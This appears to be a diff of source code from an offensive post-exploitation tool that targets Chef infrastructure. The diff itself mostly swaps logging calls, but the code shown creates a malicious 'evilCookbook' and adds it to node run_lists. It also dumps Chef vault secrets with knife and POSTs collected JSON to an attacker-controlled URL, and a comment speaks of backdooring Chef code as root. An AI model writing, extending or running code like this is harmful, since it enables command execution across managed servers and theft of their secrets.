@@ -87,7 +87,7 @@ func setRunLists(nodes []string, knifeFile string) {
 	for _, node := range nodes {
 		_, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "run_list", "add", node, "recipe["+cookbookName+"]"))
 		if err != nil {
-			log.Printf("ERROR: Unable to add the %v cookbook to the run_list for %s: %v", cookbookName, node, err)
+			log.Error().Msgf("Unable to add the %v cookbook to the run_list for %s: %v", cookbookName, node, err)
 		}
 	}
 }
@@ -179,7 +179,7 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 		log.Fatal().Err(err).Msg("Parse: ")
 	}
 	evilCookbook := []string{filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes")}
-	if system.CreateFolders(evilCookbook) {
+	if system.CreateDirectories(evilCookbook) {
 		moseutils.ColorMsgf("Successfully created the %s cookbook at %s", cookbookName, filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes"))
 	}
 
@@ -205,7 +205,7 @@ func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
 	// Logic for copying a file to the files directory
 	filesLoc := filepath.Join(cookbooksLoc, cookbookName, "files")
 	if uploadFileName != "" {
-		if system.CreateFolders([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
+		if system.CreateDirectories([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
 			moseutils.ColorMsgf("Successfully created files directory at location %s for file %s", filesLoc, uploadFileName)
 
 			// Maybe assume it isn't in current directory?
@@ -304,9 +304,7 @@ func transferJSON(jBytes []byte, endpoint string) {
 		proto = "https://"
 	}
 	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/" + endpoint
-	if debug {
-		log.Printf("Attacker url: %s", attacker)
-	}
+	log.Debug().Msgf("Attacker url: %s", attacker)
 
 	req, err := http.NewRequest("POST", attacker, bytes.NewBuffer(jBytes))
 	req.Header.Set("Content-Type", "application/json")
@@ -330,7 +328,7 @@ func transferJSON(jBytes []byte, endpoint string) {
 			if i == 4 {
 				log.Fatal().Err(err).Msg("Failure to send any responses, check host for issues")
 			}
-			log.Printf("Failure to send request. Retrying %d", i+1)
+			log.Info().Msgf("Failure to send request. Retrying %d", i+1)
 			time.Sleep(3 * time.Second)
 			continue
 		} else {
@@ -388,7 +386,7 @@ func findSecrets(knifeFile string) {
 		for _, secret := range secrets {
 			output, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "show", vault, secret))
 			if err != nil {
-				log.Printf("Error retrieving %s from the %s vault: %v", secret, vault, err)
+				log.Info().Msgf("Error retrieving %s from the %s vault: %v", secret, vault, err)
 			}
 			moseutils.ColorMsgf(strings.Join(output, " "))
 		}
@@ -399,7 +397,7 @@ func chefWorkstation(knifeFile string, chefDirs []string) {
 	log.Info().Msg("Knife binary detected, attempting to get existing nodes and cookbooks...")
 	nodes, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "list"))
 	if inspect {
-		log.Printf("BEGIN NODE LIST %v END NODE LIST", nodes)
+		log.Info().Msgf("BEGIN NODE LIST %v END NODE LIST", nodes)
 	}
 	if err == nil {
 		log.Info().Msg("We appear to be on a chef workstation")
@@ -539,11 +537,6 @@ func cleanupChef(knifeFile string) {
 func main() {
 	moseutils.NOCOLOR = noColor
 	moseutils.SetupLogger(debug)
-	//zerolog.SetGlobalLevel(zerolog.InfoLevel)
-	//if debug {
-	//zerolog.SetGlobalLevel(zerolog.DebugLevel)
-	//}
-	//log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})
 	flag.Parse()
 	// If we're not root, we probably can't backdoor any of the chef code, so exit
 	system.CheckRoot()
